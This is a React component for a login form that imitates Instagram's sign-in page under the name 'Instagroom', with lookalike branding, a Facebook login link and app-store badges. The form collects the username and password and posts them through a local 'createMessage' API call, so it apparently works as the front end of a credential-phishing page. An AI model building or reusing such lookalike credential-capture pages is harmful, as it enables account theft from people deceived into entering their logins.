import React, { useState } from 'react';
import { useForm } from "react-hook-form";
import { createMessage } from './api'
import './Form.css'
const Form = () => {
    const { register, handleSubmit } = useForm();
    const [message, setMessage] = useState("")

    // const addMessage = () => {
    //     fetch(APIURL, {
    //         method: 'POST',
    //         body: JSON.stringify(message),
    //         headers: {
    //             'content-type': 'application/json'
    //         }
    //     }).then(res => res.json())
    //     .then(data => {
    //         console.log(data)
    //     })
    // }

    const onSubmit = async (data) =>{
       try {
           const created = createMessage(data);
           console.log(created)
       } catch (error) {
           console.log(error)
       }
    }
  return(
    <div id="wrapper">
    <div className="container">
      <div className="phone-app-demo"></div>
      <div className="form-data">
        <form onSubmit={handleSubmit(onSubmit)}>
          <div className="logo">
            <h1>Instagroom</h1>
          </div>
          <input type="text" placeholder="Phone number, username, or email"  {...register("username")}/>
          <input type="text" placeholder="Password" {...register("password")} />
          <button className="form-btn" type="submit">Log in</button>
          <span className="has-separator">Or</span>
          <a className="facebook-login" href="#">
            <i className="fab fa-facebook-square"></i> Log in with Facebook
          </a>
          <a className="password-reset">Forgot password?</a>
        </form>
        <div className="sign-up">
          Don't have an account? <a>Sign up</a>
        </div>
        <div className="get-the-app">
          <span>Get the app.</span>
          <div className="badges">
            <img src={require('./images/app-store.png')} alt="app-store badge"/>
            <img src={require('./images/google-play.png')} alt="google-play badge"/>
          </div>
        </div>
      </div>
    </div>
  </div>
  )
};

export default Form;
  
